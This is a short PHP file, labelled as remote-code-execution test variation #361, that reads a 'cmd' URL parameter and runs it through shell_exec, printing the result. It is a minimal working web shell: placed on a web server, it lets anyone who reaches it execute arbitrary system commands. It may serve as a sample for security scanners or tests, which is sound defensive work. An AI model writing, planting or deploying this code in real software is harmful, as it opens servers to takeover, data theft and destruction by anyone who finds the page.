<?php
// RCE test variation #361
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>